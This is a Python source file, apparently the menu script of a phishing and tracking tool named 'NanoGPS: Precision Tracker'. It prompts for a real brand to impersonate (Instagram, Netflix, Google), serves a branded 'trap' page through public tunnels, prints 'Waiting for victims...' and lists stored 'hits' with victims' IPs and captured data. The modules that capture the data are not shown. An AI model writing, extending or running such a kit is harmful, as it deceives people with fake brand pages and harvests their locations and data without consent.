import sys
import os
import socket
import time
import threading
from server import AuraServerManager
from database import DatabaseManager
from tunnel import TunnelManager
from colors import Colors

def get_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

def view_database_hits():
    DatabaseManager.init_db()
    rows = DatabaseManager.fetch_all_hits()
    print(f"\n{Colors.CYAN}--- STORED DATABASE HITS ---{Colors.RESET}")
    if not rows:
        print(f"{Colors.RED}[!] No hits recorded yet.{Colors.RESET}")
    for row in rows:
        print(f"ID: {row[0]} | Time: {row[1]} | IP: {row[2]} | Type: {row[3]}")
        print(f"Data: {row[4][:100]}...\n" + "-"*40)
    input(f"\n{Colors.YELLOW}Press Enter to return to menu...{Colors.RESET}")

def start_trapper():
    brand_name = input(f"{Colors.YELLOW}[?] Enter Template Brand Name (e.g., Instagram, Netflix, Google): {Colors.RESET}").strip()
    if not brand_name:
        brand_name = "Instagram"

    target_url = input(f"{Colors.YELLOW}[?] Enter Target Redirect URL (default: https://google.com): {Colors.RESET}").strip()
    if not target_url:
        target_url = "https://google.com"

    theme = input(f"{Colors.YELLOW}[?] Template Theme [dark/light/auto] (default: dark): {Colors.RESET}").strip().lower()
    if theme not in ("dark", "light", "auto"):
        theme = "dark"

    accent = input(f"{Colors.YELLOW}[?] Custom Accent Hex (e.g., #22c55e, Enter to skip): {Colors.RESET}").strip()
    if not accent:
        accent = None

    port = get_free_port()
    server = AuraServerManager.start_server(port, brand_name, target_url, theme=theme, accent=accent)
    
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    print(f"{Colors.GREEN}[+] Local Server started on http://localhost:{port}{Colors.RESET}")

    # Start multi-tunnel selection with mandatory localhost view
    proc = TunnelManager.start_tunnel(port)

    print(f"{Colors.YELLOW}Waiting for victims... (Press Ctrl+C to stop server){Colors.RESET}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[*] Stopping Trap Server & Tunnels...{Colors.RESET}")
    finally:
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except Exception:
                try: proc.kill()
                except Exception: pass
        server.shutdown()
        server.server_close()

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Colors.RED}{Colors.BOLD}")
        print("==========================================")
        print("     🌐 NanoGPS: Precision Tracker 🌐     ")
        print("==========================================")
        print(f"{Colors.CYAN} [1] Start Dynamic Trap & Multi-Tunnel")
        print(f" [2] View Stored Database Hits")
        print(f" [0] Exit{Colors.RESET}")
        
        choice = input(f"\n{Colors.GREEN}nanogps > {Colors.RESET}").strip()
        if choice == '1':
            start_trapper()
        elif choice == '2':
            view_database_hits()
        elif choice == '0':
            sys.exit()

if __name__ == "__main__":
    main()